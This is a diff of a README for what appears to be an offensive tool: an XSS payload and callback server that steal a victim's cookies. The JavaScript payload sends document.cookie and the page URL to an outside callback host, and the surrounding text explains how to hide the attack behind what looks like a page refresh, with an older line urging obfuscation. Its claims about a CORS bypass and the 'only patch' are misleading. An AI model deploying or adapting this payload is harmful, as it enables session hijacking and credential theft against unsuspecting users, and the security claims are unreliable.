@@ -1,23 +1,27 @@
-## Description
+## Bypass Cross-Origin Resource Sharing restrictions
 
-This repo contains an example of a CORS callback server and an XSS payload that, once executed, will change the current window location of the victim to your callback address, which returns a **301 Moved Permanently** response sending the victim back to its referer, although this time with a token in the URL anchor, preventing the XSS payload from reactivating.
+This demonstrates how the location setter of browsers are vulnerable to cross origin resource sharing.
 
-This enables you to sniff sensitive data via URL parameters when the victim is sent to your callback address.
+The only patch for this would be to stop allowing URL parameters for all GET requests.
 
-If the victim did not send a Referer header, you can include the referer address in a URL parameter. If no referer is provided, the victim will be redirected to a panic address of your choice, in an attempt to keep the attack hidden.
+This repo includes an example XSS payload and callback that, once executed, will change a browser's location to your callback server, which returns a **301 Moved Permanently** response sending the victim back to its referrer.
 
-**When the attack is successful, the victim experienced what seemed like a page refresh at most.**
+This example also includes a token to facilitate stored and reflected XSS; a token is added to the URL's anchor preventing the XSS payload from reactivating.
+
+**When the attack is executed successfully, the victim experienced what seemed like a page refresh at most.**
 
 ## Usage
 
-Use the following code in your XSS payload. Be sure to change the address to that of your callback server, and change the token at the very least. The more you obfuscate this code, the more likely your attack will succeed. 
+Use the following code in your XSS payload. You must change the new location's address to that of your callback server, and change the token at the very least.
+
+You can shorten this code by removing the token if you are not using it in stored or reflected XSS.
 
 ```javascript
 const token = "w3lRZ87e";
-if (location.hash != token) self.location = "https://mycallbackserver.net/callback.php" + 
-  "?referer=" + encodeURIComponent( btoa(self.location.href) ) + 
-  "&data=" + encodeURIComponent( btoa(document.cookie) ) + 
-  "&token=" + encodeURIComponent( btoa(token) );
+if (location.hash != token) globalThis.location = "https://mycallbackserver.net/callback.php" + 
+  "?referer=" + encodeURIComponent(btoa(globalThis.location.href)) + 
+  "&data=" + encodeURIComponent(btoa(document.cookie)) + 
+  "&token=" + encodeURIComponent(btoa(token));
 ```
 
-<sup>If you choose not to include a referer in the URL parameters, the callback server defaults to the **`Referer`** header of the request.<br>If neither a referer parameter or Referer header is present, the victim is redirected to the panic address.</sup>
+If the victim did not send a `referer` URL parameter, the attacker's server looks for a `Referer` header value. If neither of those are provided, the victim will be redirected to a panic address of your choice.
